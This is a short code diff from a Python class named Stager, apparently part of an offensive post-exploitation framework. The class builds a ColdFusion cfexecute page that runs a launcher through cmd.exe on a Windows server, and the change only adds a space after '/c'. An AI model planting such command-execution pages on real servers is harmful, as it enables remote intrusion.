@@ -85,7 +85,7 @@ class Stager:
             return ""
 	else:
 			code = '''<cfexecute name = "C:\Windows\system32\cmd.exe"
-arguments = "/c''' + str(launcher) + '''"
+arguments = "/c ''' + str(launcher) + '''"
 timeout = "10">
 </cfexecute>
 '''
